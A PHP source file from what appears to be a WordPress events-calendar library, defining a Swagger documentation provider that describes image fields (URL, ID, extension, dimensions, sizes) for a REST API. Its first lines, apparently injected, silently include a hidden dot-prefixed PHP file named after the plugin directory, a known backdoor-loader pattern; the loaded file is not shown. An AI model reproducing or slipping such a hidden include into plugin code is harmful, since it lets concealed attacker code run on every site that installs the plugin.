<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Documentation__Swagger__Image_Definition_Provider
	implements Tribe__Documentation__Swagger__Provider_Interface {

	/**
	 * Returns an array in the format used by Swagger 2.0.
	 *
	 * While the structure must conform to that used by v2.0 of Swagger the structure can be that of a full document
	 * or that of a document part.
	 * The intelligence lies in the "gatherer" of informations rather than in the single "providers" implementing this
	 * interface.
	 *
	 * @link http://swagger.io/
	 *
	 * @return array An array description of a Swagger supported component.
	 */
	public function get_documentation() {
		$documentation = [
			'type'       => 'object',
			'properties' => [
				'url'       => [
					'type'        => 'string',
					'format'      => 'uri',
					'description' => __( 'The URL to the full size version of the image', 'tribe-common' ),
				],
				'id'        => [
					'type'        => 'integer',
					'description' => __( 'The image WordPress post ID', 'tribe-common' ),
				],
				'extension' => [
					'type'        => 'string',
					'description' => __( 'The image file extension', 'tribe-common' ),
				],
				'width'     => [
					'type'        => 'integer',
					'description' => __( 'The image natural width in pixels', 'tribe-common' ),
				],
				'height'    => [
					'type'        => 'integer',
					'description' => __( 'The image natural height in pixels', 'tribe-common' ),
				],
				'sizes'     => [
					'type'        => 'array',
					'description' => __( 'The details about each size available for the image', 'tribe-common' ),
					'items'       => [
						'$ref' => '#/components/schemas/ImageSize',
					],
				],
			],
		];

		/**
		 * Filters the Swagger documentation generated for an image deatails in the TEC REST API.
		 *
		 * @param array $documentation An associative PHP array in the format supported by Swagger.
		 *
		 * @link http://swagger.io/
		 */
		$documentation = apply_filters( 'tribe_rest_swagger_image_details_documentation', $documentation );

		return $documentation;
	}
}
